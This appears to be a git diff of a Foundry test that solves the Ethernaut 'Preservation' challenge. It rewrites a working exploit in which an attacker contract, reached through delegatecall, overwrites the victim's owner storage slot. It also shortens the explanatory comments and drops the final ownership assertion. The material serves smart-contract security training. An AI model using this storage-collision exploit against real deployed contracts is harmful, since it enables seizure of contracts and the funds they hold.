@@ -24,8 +24,9 @@ contract TestPreservation is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Preservation(levelAddress);
 
@@ -34,61 +35,45 @@ contract TestPreservation is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // Preservation contract is vulnerable to attack via delegatecall, because it does not account for storage layouts of the library contracts.
+        // setFirstTime() and setSecondTime() functions in Preservation contract delegatecall to the setTime() function, which changes the storage slot 0.
+        // But since its delegatecall, the storage slot 0 is changed in the context of the Preservation contract, not the LibraryContract.
+
+        // We can use this to set timeZone1Library to the address of a mallicious contract, which implements the setTime().
+        // The storage layout then should copy the storage layout of the Preservation, but the setTime() function must change the storage slot 2.
+        // This way we can change the owner of the Preservation contract to any address we want.
 
         vm.startPrank(player, player);
 
-        // This one is a complex one
-        // First of all you need to remember how the `delegatecall` function works.
-        // Second of all you need to remember how the contract storage layout works
-        // And last some solidity knowledge about the address type and how it can be casted
+        // Deploy a mallicious contract that implements the setTime() function and mirrors the storage layout of the Preservation contract.
+        Exploit exploit = new Exploit(level);
 
-        // delegatecall -> it's a special function that allow contract A to call an implementation method on contract B but
-        // using the contract A "context"
-        // What does it mean?
-        // That the delegatecall will execute a function in B code but the storage (read/write) is from contract A
-        // and B `msg.sender` is not the caller (contract A) but the contract A caller
-        // More info here:
-        // - https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries
-        // - https://solidity-by-example.org/delegatecall
-        // - https://solidity-by-example.org/hacks/delegatecall
+        // Set timeZone1Library to the address of the Exploit contract.
+        level.setFirstTime(uint256(address(exploit)));
 
-        // contract storage layout
-        // I've already explained this but in a contract storage each variable take an entire slot (256 bits)
-        // if they cannot be packed togheter
-        // In this case slot0 -> timeZone1Library | slot1 -> timeZone2Library | slot2 -> owner | slot3 -> storedTime
-        // why is important to know it?
-        // Because as we said `delegatecall` use the caller's context, so when the `LibraryContract` will modify the `storedTime` variable
-        // it will modify that variable in the Preservation contract and not in the LibraryContract
-        // And this would be totally fine but only if the library/delegated contract have the SAME storage layout as the caller
-        // In this case `LibraryContract` is updating the `slot0` slot of `Preservation` contract that is not the `storedTime` variable
-        // but the `timeZone1Library` address variable itself!
-
-        // What if we could replace that address with another contract address and when our contract will be called we are going to
-        // replace the `owner` slot address (because also our contract will be called via a delegatecall)?
-
-        // To do so we need to transform cast our Exploiter address to a uint256
-        // After doing so, calling `level.setFirstTime` will call `exploiter.setTime` that in our implementation
-        // is going to cast the `_time` uint256 back to an address replacing the `Preservation`'s `owner` with the
-        // player address (that have been converted earlier to a uint256)
-
-        Exploiter exploiter = new Exploiter();
-
-        level.setFirstTime(uint256(address(exploiter)));
+        // Call the same function to change the owner of the Preservation contract.
         level.setFirstTime(uint256(player));
 
         vm.stopPrank();
-
-        assertEq(level.owner(), player);
     }
 }
 
-contract Exploiter {
+contract Exploit {
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
 
-    function setTime(uint256 time) public {
-        owner = address(time);
+    Preservation public victim;
+
+    constructor(Preservation _victim) public {
+        victim = _victim;
+    }
+
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time));
     }
 }
